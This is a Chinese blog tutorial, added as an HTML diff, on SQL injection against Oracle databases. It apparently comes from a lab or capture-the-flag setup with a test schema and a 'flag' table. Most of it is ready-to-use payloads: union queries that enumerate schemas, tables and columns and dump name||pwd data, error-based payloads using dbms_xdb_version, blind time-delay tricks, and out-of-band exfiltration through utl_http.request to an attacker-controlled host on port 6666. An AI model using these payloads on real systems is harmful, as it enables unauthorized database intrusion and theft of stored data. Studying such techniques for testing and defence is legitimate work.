@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword" content="">
+    <meta name="theme-color" content="#600090">
+    <meta name="msapplication-navbutton-color" content="#600090">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
+    <link rel="shortcut icon" href="/img/marmot.jpg">
+    <link rel="alternate" type="application/atom+xml" title="marmot" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
+    <title>
+        
+        Oracle数据库注入｜marmot&#39;s blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.marmot.vip/Oracle/">
+
+    <!-- Bootstrap Core CSS -->
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/blog-style.css">
+
+
+    <!-- Pygments Github CSS -->
+    
+<link rel="stylesheet" href="/css/syntax.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<style>
+
+    header.intro-header {
+        background-image: url('img/back.jpg')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "true" data-istags="false
+" data-ishome = "false" >
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand animated pulse" href="/">
+                <span class="brand-logo">
+                    marmot
+                </span>
+                's Blog
+            </a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <!-- /.navbar-collapse -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+					
+                    
+                        
+							
+                        <li>
+                            <a href="/Tags/">Tags</a>
+                        </li>
+							
+						
+                    
+                        
+							
+                        <li>
+                            <a href="/work/">work</a>
+                        </li>
+							
+						
+                    
+					
+					
+                </ul>
+            </div>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+//    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+<!-- Main Content -->
+
+<!--only post-->
+
+
+<img class="wechat-title-img"
+     src="undefinedimg/back2.jpg">
+
+
+<style>
+    
+    header.intro-header {
+        background-image: url('img/back2.jpgundefined')
+    }
+
+    
+</style>
+
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <div class="post-heading">
+                    <h1>Oracle数据库注入</h1>
+                    
+                    <h2 class="subheading">五百人中第一仙。等闲平步上青天。</h2>
+                    
+                    <span class="meta">
+                         作者 marmot
+                        <span>
+                          日期 2021-07-19
+                         </span>
+                    </span>
+                    <div class="tags text-center">
+                        
+                        <a class="tag" href="/tags/#Oracle"
+                           title="Oracle">Oracle</a>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="post-title-haojen">
+        <span>
+            Oracle数据库注入
+        </span>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Container -->
+            <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
+                <h1 id="Oracle数据库注入"><a href="#Oracle数据库注入" class="headerlink" title="Oracle数据库注入"></a>Oracle数据库注入</h1><h3 id="000-Oracle数据库介绍"><a href="#000-Oracle数据库介绍" class="headerlink" title="000 Oracle数据库介绍"></a>000 Oracle数据库介绍</h3><p>Oracle Database，又名Oracle RDBMS，或简称Oracle。是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%94%B2%E9%AA%A8%E6%96%87%E5%85%AC%E5%8F%B8/430115">甲骨文公司</a>的一款<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/11032386">关系数据库管理系统</a>。它是在数据库领域一直处于领先地位的产品。可以说Oracle数据库系统是目前世界上流行的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/1237340">关系数据库</a>管理系统，系统<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%8F%AF%E7%A7%BB%E6%A4%8D%E6%80%A7/6931884">可移植性</a>好、使用方便、功能强，适用于各类大、中、小<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BE%AE%E6%9C%BA/5511409">微机</a>环境。它是一种高效率的、可靠性好的、适应高<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%90%9E%E5%90%90%E9%87%8F/157092">吞吐量</a>的数据库方案。</p>
+<h3 id="001-Oracle数据库特点"><a href="#001-Oracle数据库特点" class="headerlink" title="001 Oracle数据库特点"></a>001 Oracle数据库特点</h3><p>oracle数据库查询必须跟from tb_name</p>
+<p>union select 前后数据类型必须一致，可以使用null代替。</p>
+<p>length()函数返回长度</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用dual判断是否为oracle数据库</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> dual)</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> user_tables)</span><br><span class="line">使用user_tables判断是否为oracle数据库（user_table存放用户信息）</span><br><span class="line">#数据库版本</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sys.v_$version</span><br></pre></td></tr></table></figure>
+
+<p>Oracle无limit</p>
+<p>使用 where rownum = 1/2/3/4 数值 来选择显示第几行</p>
+<p>and banner not in (‘上一行的值’)</p>
+<p>nvl(str,’a’) 判断是否为空，空转换为a</p>
+<p>not in  和 &lt;&gt;一样互相可代替</p>
+<p><code>select dstinct(owner from sys.all_tables)</code>去重</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>查询数据库版本</span><br><span class="line">#payload(<span class="number">1</span>)：</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,banner,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> sys.v_$version <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="comment">-- +</span></span><br><span class="line">#payload(<span class="number">2</span>):</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,banner,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> (<span class="keyword">select</span> banner,rownum <span class="keyword">as</span> limit <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">distinct</span>(banner) <span class="keyword">from</span> sys.v_$version)) <span class="keyword">where</span> limit<span class="operator">=</span><span class="number">2</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/Oracle/image-20210719200350013.png"></p>
+<p>Oracle数据库使用||进行字符串的拼接 <code>&#39;a&#39;||&#39;b&#39;</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>当前数据库的用户名：</span><br><span class="line">#SYS_CONTEXT(<span class="string">&#x27;USERENV&#x27;</span>,<span class="string">&#x27;CURRENT_USER&#x27;</span>)</span><br><span class="line">#payload:</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,SYS_CONTEXT(<span class="string">&#x27;USERENV&#x27;</span>,<span class="string">&#x27;CURRENT_USER&#x27;</span>),<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> dual <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><figcaption><span>获取数据库名称</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> 获取数据库名称</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> all_tables;</span><br><span class="line"><span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span>num <span class="keyword">and</span> owner <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;sys&#x27;</span>);</span><br><span class="line">#payload:</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,owner,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> owner <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;SYS&#x27;</span>) <span class="comment">-- +</span></span><br><span class="line">#payload(<span class="number">1</span>):</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,owner,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> (<span class="keyword">select</span> owner,ROWNUM <span class="keyword">as</span> limit <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">DISTINCT</span>(owner) <span class="keyword">from</span> sys.all_tables)) <span class="keyword">where</span> limit<span class="operator">=</span><span class="number">1</span><span class="comment">--</span></span><br><span class="line">#payload(<span class="number">2</span>):</span><br><span class="line"><span class="keyword">select</span> owner,rownum <span class="keyword">as</span> a <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">distinct</span>(owner) <span class="keyword">from</span> sys.all_tables) <span class="keyword">where</span> a <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">注：从查询出的所有库名去重然后查询出库名和行号，行号作为条件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Oracle/image-20210719200436000.png"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>获取表名</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> owner<span class="operator">=</span><span class="string">&#x27;test&#x27;</span> <span class="keyword">and</span> table_name <span class="keyword">not</span> <span class="keyword">in</span> ();</span><br><span class="line">#payload(<span class="number">1</span>):</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> owner<span class="operator">=</span><span class="string">&#x27;TEST&#x27;</span> <span class="keyword">and</span> table_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line">#payload(<span class="number">2</span>):</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>将表名格式化字符串，然后先取出所有的表名去重，再将行数作为另一个字段，再从这个（表名，行数）表里查表名，限制条件为行数LIMIT(行数改名)</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">CAST</span>(table_name <span class="keyword">as</span> <span class="type">varchar</span>(<span class="number">400</span>)),<span class="number">3</span>,<span class="number">2</span> <span class="keyword">from</span> (<span class="keyword">select</span> table_name,rownum <span class="keyword">as</span> LIMIT <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">DISTINCT</span>(table_name) <span class="keyword">from</span> all_tables <span class="keyword">where</span> owner<span class="operator">=</span><span class="string">&#x27;TEST&#x27;</span>)) <span class="keyword">where</span> LIMIT<span class="operator">=</span><span class="number">1</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/Oracle/image-20210719201930560.png"></p>
+<p><img src="/Oracle/image-20210719105357224.png" alt="image-20210719105357224"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>获取字段名</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> user_tab_columns;</span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> table_name <span class="operator">=</span>  <span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> column_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;xxxx&#x27;</span>);</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">CAST</span>(column_name <span class="keyword">as</span> <span class="type">varchar</span>(<span class="number">400</span>)),<span class="number">3</span>,<span class="number">2</span> <span class="keyword">from</span> (<span class="keyword">select</span> column_name,rownum <span class="keyword">as</span> LIMIT <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">DISTINCT</span>(column_name) <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;FLAG&#x27;</span>)) <span class="keyword">where</span> LIMIT<span class="operator">=</span><span class="number">1</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/Oracle/image-20210719203930860.png" alt="image-20210719203930860"></p>
+<p><img src="/Oracle/image-20210719105132391.png" alt="image-20210719105132391"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">\\查询数据</span><br><span class="line"><span class="keyword">select</span> id<span class="operator">||</span>name <span class="keyword">from</span> test.demo;</span><br><span class="line"><span class="keyword">select</span> id<span class="operator">||</span>name <span class="keyword">from</span> test.demo <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,name<span class="operator">||</span>pwd,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> flag <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="comment">-- +</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,concat(name,pwd),<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> flag <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="comment">-- +</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">cast</span>(name<span class="operator">||</span>pwd <span class="keyword">as</span> <span class="type">varchar</span>(<span class="number">4000</span>)),<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> (<span class="keyword">select</span> name,pwd,rownum <span class="keyword">as</span> LIMIT <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag)) <span class="keyword">where</span> LIMIT<span class="operator">=</span><span class="number">1</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Oracle数据库报错注入"><a href="#Oracle数据库报错注入" class="headerlink" title="Oracle数据库报错注入"></a>Oracle数据库报错注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>dbms_xdb_version.checkin()</span><br><span class="line">#<span class="keyword">sql</span>:</span><br><span class="line"><span class="keyword">select</span> dbms_xdb_version.checkin(<span class="keyword">select</span> sys_context(<span class="string">&#x27;USERENV&#x27;</span>,<span class="string">&#x27;CURRENT_USER&#x27;</span>) <span class="keyword">FROM</span> dual) <span class="keyword">from</span> dual;</span><br><span class="line">#payload(<span class="number">1</span>):</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">and</span> (<span class="keyword">select</span> dbms_xdb_version.checkin((<span class="keyword">select</span> sys_context(<span class="string">&#x27;USERENV&#x27;</span>,<span class="string">&#x27;CURRENT_USER&#x27;</span>) <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="comment">-- +</span></span><br><span class="line">#payload(<span class="number">2</span>):</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">and</span> (<span class="keyword">select</span> dbms_xdb_version.checkin((<span class="keyword">select</span> <span class="built_in">CAST</span>(column_name <span class="keyword">as</span> <span class="type">varchar</span>(<span class="number">400</span>)) <span class="keyword">from</span> (<span class="keyword">select</span> column_name,rownum <span class="keyword">as</span> LIMIT <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">DISTINCT</span>(column_name) <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;FLAG&#x27;</span>)) <span class="keyword">where</span> LIMIT<span class="operator">=</span><span class="number">2</span>)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="comment">-- +</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>bms_xdb_version.uncheckout()</span><br><span class="line">#<span class="keyword">sql</span>:</span><br><span class="line"><span class="keyword">select</span> dbms_xdb_version.uncheckout(<span class="keyword">select</span> sys_context(<span class="string">&#x27;USERENV&#x27;</span>,<span class="string">&#x27;CURRENT_USER&#x27;</span>) <span class="keyword">FROM</span> dual) <span class="keyword">from</span> dual;</span><br><span class="line">#payload(<span class="number">1</span>):</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">and</span> (<span class="keyword">select</span> dbms_xdb_version.uncheckout((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="comment">-- +</span></span><br><span class="line">#payload(<span class="number">2</span>):</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">and</span> (<span class="keyword">select</span> dbms_xdb_version.uncheckout((<span class="keyword">select</span> sys_context(<span class="string">&#x27;USERENV&#x27;</span>,<span class="string">&#x27;CURRENT_USER&#x27;</span>) <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="comment">-- +</span></span><br><span class="line">#payload(<span class="number">3</span>):</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">and</span> (<span class="keyword">select</span> dbms_xdb_version.uncheckout((<span class="keyword">select</span> <span class="built_in">CAST</span>(column_name <span class="keyword">as</span> <span class="type">varchar</span>(<span class="number">400</span>)) <span class="keyword">from</span> (<span class="keyword">select</span> column_name,rownum <span class="keyword">as</span> LIMIT <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">DISTINCT</span>(column_name) <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;FLAG&#x27;</span>)) <span class="keyword">where</span> LIMIT<span class="operator">=</span><span class="number">3</span>)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="comment">-- +</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>utl_inaddr.get_host_name()</span><br><span class="line">#paylaod</span><br><span class="line"><span class="keyword">select</span> utl_inaddr.get_host_name(<span class="string">&#x27;主机&#x27;</span>) <span class="keyword">from</span> dual;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#其他函数</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>dbms_xdb_version_.makeversioned()</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>dbms_utility.sqlid_to_sqlhash()</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>ordsys.ord_dicom.getmappingxpath()</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>ctxsys.drithsx.sn()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Oracle/image-20210719202014274.png"></p>
+<p><img src="/Oracle/image-20210719141917778.png" alt="image-20210719141917778"></p>
+<p><img src="/Oracle/image-20210719202042700.png"></p>
+<p><img src="/Oracle/image-20210719200731896.png"></p>
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>decode()、instr()</p>
+<p>decode()函数</p>
+<p>decode(substr(str,1,1),’a’,1,0) 第一位与a对比，一样返回 1，否则返回0</p>
+<p>where instr(substr(str,1,1),’1’)=1</p>
+<p>where ascii(substr(str,1,1))&gt;100</p>
+<p>dbms_pipe.receive+message(‘a’,3) from dual 时间延迟</p>
+<p>a可以使用chr()</p>
+<p>decode(substr(str,1,1),’a’,dbms_pipe.receive+message(‘a’,3),0)</p>
+<h4 id="oracle外带注入"><a href="#oracle外带注入" class="headerlink" title="oracle外带注入"></a>oracle外带注入</h4><p>utl_http.request()函数</p>
+<p><code>select utl_http.request(&#39;http://ip/?data=&#39;||(select owner from all_tables where rownum=1)) from dual;</code></p>
+<p><code>?id=1 and (select utl_http.request(&#39;http://ip/?data=&#39;||(select owner from all_tables where rownum=1)) from dual)is not null</code></p>
+<p>||run(‘exec’,’whoami’,’utf-8’)</p>
+<h3 id="oracle注入中的联合查询注入"><a href="#oracle注入中的联合查询注入" class="headerlink" title="oracle注入中的联合查询注入"></a>oracle注入中的联合查询注入</h3><h4 id="0x001判断数据库类型"><a href="#0x001判断数据库类型" class="headerlink" title="0x001判断数据库类型"></a>0x001判断数据库类型</h4><p>payload: ?id=1 and exists(select * from dual)</p>
+<p><img src="/Oracle/image-20210719202132454.png"></p>
+<h4 id="0x002-获取查询列数"><a href="#0x002-获取查询列数" class="headerlink" title="0x002 获取查询列数"></a>0x002 获取查询列数</h4><p>payload: ?id=1 order by 4 – +</p>
+<p><img src="/Oracle/image-20210719202219039.png"></p>
+<h4 id="0x003-判断显示位以及各位的数据类型"><a href="#0x003-判断显示位以及各位的数据类型" class="headerlink" title="0x003 判断显示位以及各位的数据类型"></a>0x003 判断显示位以及各位的数据类型</h4><p>payload: ?id=-1 union select 1,’a’,3,4 from dual – +</p>
+<p><img src="/Oracle/image-20210719202252651.png"></p>
+<h4 id="0x004-获取到test数据库"><a href="#0x004-获取到test数据库" class="headerlink" title="0x004 获取到test数据库"></a>0x004 获取到test数据库</h4><p>payload: ?id=-1 union select 1,owner,3,4 from (select owner,ROWNUM as limit from (select DISTINCT(owner) from sys.all_tables)) where limit=17 – +</p>
+<p><img src="/Oracle/image-20210719202446350.png"></p>
+<h4 id="0x005-获取test库下的表"><a href="#0x005-获取test库下的表" class="headerlink" title="0x005 获取test库下的表"></a>0x005 获取test库下的表</h4><p>payload:?id=-1 union select 1,CAST(table_name as varchar(400)),3,2 from (select table_name,rownum as LIMIT from (select DISTINCT(table_name) from all_tables where owner=’TEST’)) where LIMIT=1 – +<img src="/Oracle/image-20210719202525677.png"></p>
+<h4 id="0x006-获取DEMO表下的字段"><a href="#0x006-获取DEMO表下的字段" class="headerlink" title="0x006 获取DEMO表下的字段"></a>0x006 获取DEMO表下的字段</h4><p>payload: ?id=-1 union select 1,CAST(column_name as varchar(400)),3,2 from (select column_name,rownum as LIMIT from (select DISTINCT(column_name) from user_tab_columns where table_name=’DEMO’)) where LIMIT=1 – +</p>
+<p><img src="/Oracle/image-20210719202734115.png" alt="image-20210719202734115"></p>
+<p>四个字段分别为：id name age sex</p>
+<h4 id="0x007-获取DEMO表的第三行数据"><a href="#0x007-获取DEMO表的第三行数据" class="headerlink" title="0x007 获取DEMO表的第三行数据"></a>0x007 获取DEMO表的第三行数据</h4><p>payload: ?id=-1 union select 1,cast(id||’<del>‘||name||’</del>‘||sex||’~’||age as varchar(4000)),2,3 from (select id,name,sex,age,rownum as LIMIT from demo) where LIMIT=3 – +</p>
+<p><img src="/Oracle/image-20210719202817527.png" alt="image-20210719202817527"></p>
+<h2 id="oracle注入中的外带数据注入"><a href="#oracle注入中的外带数据注入" class="headerlink" title="oracle注入中的外带数据注入"></a>oracle注入中的外带数据注入</h2><h4 id="0x001-获取test数据库"><a href="#0x001-获取test数据库" class="headerlink" title="0x001 获取test数据库"></a>0x001 获取test数据库</h4><p>payload: ?id=1 and utl_http.request(‘<a target="_blank" rel="noopener" href="http://xx.xx.x.xx:6666/?data=&#39;||">http://xx.xx.x.xx:6666/?data=&#39;||</a>(select owner from (select owner,ROWNUM as limit from (select DISTINCT(owner) from sys.all_tables)) where limit=17))=1 – +</p>
+<p><img src="/Oracle/image-20210719203412410.png" alt="image-20210719203412410"></p>
+<h4 id="0x002-获取test库下的DEMO表"><a href="#0x002-获取test库下的DEMO表" class="headerlink" title="0x002 获取test库下的DEMO表"></a>0x002 获取test库下的DEMO表</h4><p>payload: ?id=-1 and utl_http.request(‘<a target="_blank" rel="noopener" href="http://xx.xx.x.x:6666/?data=&#39;||">http://xx.xx.x.x:6666/?data=&#39;||</a>(select CAST(table_name as varchar(400)) from (select table_name,rownum as LIMIT from (select DISTINCT(table_name) from all_tables where owner=’TEST’)) where LIMIT=1))=1 – +</p>
+<p><img src="/Oracle/image-20210719203445260.png" alt="image-20210719203445260"></p>
+<h4 id="0x003-获取DEMO表中的字段"><a href="#0x003-获取DEMO表中的字段" class="headerlink" title="0x003 获取DEMO表中的字段"></a>0x003 获取DEMO表中的字段</h4><p>payload: ?id=-1 and utl_http.request(‘<a target="_blank" rel="noopener" href="http://xx.xx.xx.x:6666/?data=&#39;||">http://xx.xx.xx.x:6666/?data=&#39;||</a>(select CAST(column_name as varchar(400)) from (select column_name,rownum as LIMIT from (select DISTINCT(column_name) from user_tab_columns where table_name=’DEMO’)) where LIMIT=5))=1 – +</p>
+<p><img src="/Oracle/image-20210719203538730.png" alt="image-20210719203538730"></p>
